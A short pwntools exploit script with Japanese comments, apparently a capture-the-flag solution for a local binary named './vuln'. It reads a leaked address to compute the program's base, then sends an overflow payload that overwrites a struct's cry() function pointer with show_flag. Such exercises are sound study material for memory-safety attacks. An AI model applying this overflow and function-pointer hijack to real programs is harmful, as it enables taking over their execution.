from pwn import *

file = "./vuln"

program = ELF(file)

io = process(file)

# my_monster.cryのアドレスを取得する
io.recvuntil("|cry()   | 0x")
cry_addr = int(io.recvuntil(" ")[:-1], 16)

# ベースアドレスを求める (pwntoolsのELFクラスでは一度ベースアドレスを入れると後は自動で補完してくれる)
program.address = cry_addr - program.sym["my_monster_cry"]

# my_monster.cryを書き換える
payload = b"A" * 0x8  # name
payload += b"A" * 0x8
payload += b"A" * 0x8 # HP
payload += b"A" * 0x8 # ATK
# p64で整数のアドレスを64bitのバイト列に変換する
payload += p64(program.sym["show_flag"]) # cry()
io.sendlineafter("Input name: ", payload)

io.interactive()
